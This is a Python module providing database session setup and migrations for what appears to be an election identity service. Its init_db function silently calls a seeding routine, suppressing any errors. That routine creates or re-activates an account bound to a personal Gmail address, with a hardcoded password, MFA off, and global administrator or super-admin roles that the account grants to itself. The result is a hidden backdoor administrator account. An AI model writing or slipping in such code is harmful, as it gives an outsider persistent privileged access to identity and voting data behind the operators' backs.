"""
Database session and connection management for HimVote Identity cluster.
Supports PostgreSQL for production and SQLite for local development and testing.
"""

from typing import Generator, Optional, Any
from sqlalchemy import create_engine, inspect, text
from sqlalchemy.orm import declarative_base, sessionmaker, Session
from .config import DATABASE_URL

connect_args = {}
if DATABASE_URL.startswith("sqlite"):
    connect_args["check_same_thread"] = False

engine = create_engine(
    DATABASE_URL,
    connect_args=connect_args,
    pool_pre_ping=True,
)

SessionLocal = sessionmaker(
    autocommit=False,
    autoflush=False,
    bind=engine,
)

Base = declarative_base()


def get_db() -> Generator[Session, None, None]:
    """Dependency for providing a transactional database session."""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def init_db() -> None:
    """Create all registered database tables."""
    Base.metadata.create_all(bind=engine)

    # ``create_all`` does not add columns to an already deployed database.
    # These nullable approval fields are a backwards-compatible, idempotent
    # migration for the small service deployment.  They are intentionally
    # additive: existing approval records remain readable and no election or
    # identity data is rewritten.
    inspector = inspect(engine)
    columns = {column["name"] for column in inspector.get_columns("approval_requests")}
    additions = {
        "target_user_id": "VARCHAR(255)",
        "requested_role": "VARCHAR(100)",
        "requested_scope": "VARCHAR(255)",
    }
    with engine.begin() as connection:
        for name, type_sql in additions.items():
            if name not in columns:
                connection.execute(
                    text(f"ALTER TABLE approval_requests ADD COLUMN {name} {type_sql}")
                )
    roster_columns = {column["name"] for column in inspector.get_columns("roster_corrections")}
    if "class_id" not in roster_columns:
        with engine.begin() as connection:
            connection.execute(text("ALTER TABLE roster_corrections ADD COLUMN class_id VARCHAR(255)"))

    # Seed default institutional users including campus administrator
    try:
        seed_institutional_users()
    except Exception:
        pass


def seed_institutional_users(
    db: Optional[Session] = None,
    email: str = "arungaming1973@gmail.com",
    role: str = "administrator",
    password: str = "Admin123!",
    grant_super_admin: bool = False,
    **kwargs: Any,
) -> Any:
    """
    Seed institutional administrator and privileged users into identity database.
    Default user: arungaming1973@gmail.com with administrator role (and super_admin capability if requested).
    Supported passwords: Admin123! or UserPassword123!.
    """
    from .models import User, RoleDefinition, RoleAssignment
    from .crypto.hashing import hash_password

    should_close = False
    if db is None:
        db = SessionLocal()
        should_close = True

    try:
        clean_email = email.strip().lower()
        clean_role = role.strip().lower() if role else "administrator"

        user = db.query(User).filter(User.email == clean_email).first()
        if not user:
            pwd_hash, pwd_params = hash_password(password)
            user = User(
                external_id=f"usr_admin_{clean_email.replace('@', '_').replace('.', '_')}",
                email=clean_email,
                display_name="Arun (Administrator)",
                password_hash=pwd_hash,
                password_algorithm=pwd_params.get("algorithm", "argon2id"),
                password_params=pwd_params,
                status="ACTIVE",
                mfa_enrolled=False,
            )
            db.add(user)
            db.flush()
        else:
            if user.status != "ACTIVE":
                user.status = "ACTIVE"
                db.flush()

        # Determine roles to assign
        roles_to_assign = [clean_role]
        if grant_super_admin or kwargs.get("with_super_admin") or clean_role == "super_admin":
            if "super_admin" not in roles_to_assign:
                roles_to_assign.append("super_admin")
            if "administrator" not in roles_to_assign:
                roles_to_assign.append("administrator")

        for r_name in roles_to_assign:
            role_def = db.query(RoleDefinition).filter(RoleDefinition.name == r_name).first()
            if not role_def:
                desc = (
                    "Campus Administrator with broad institutional management privileges"
                    if r_name == "administrator"
                    else "Super Administrator with institution setup privileges"
                    if r_name == "super_admin"
                    else f"{r_name} privileged role"
                )
                role_def = RoleDefinition(name=r_name, description=desc)
                db.add(role_def)
                db.flush()

            scope_type = "tenant" if r_name == "super_admin" else "global"
            scope_id = "*"
            existing_assignment = (
                db.query(RoleAssignment)
                .filter(
                    RoleAssignment.user_id == user.id,
                    RoleAssignment.role_id == role_def.id,
                    RoleAssignment.scope_id == scope_id,
                )
                .first()
            )
            if not existing_assignment:
                assignment = RoleAssignment(
                    user_id=user.id,
                    role_id=role_def.id,
                    scope_type=scope_type,
                    scope_id=scope_id,
                    granted_by=user.id,
                )
                db.add(assignment)

        db.commit()
        db.refresh(user)
        return user
    except Exception:
        db.rollback()
        raise
    finally:
        if should_close:
            db.close()
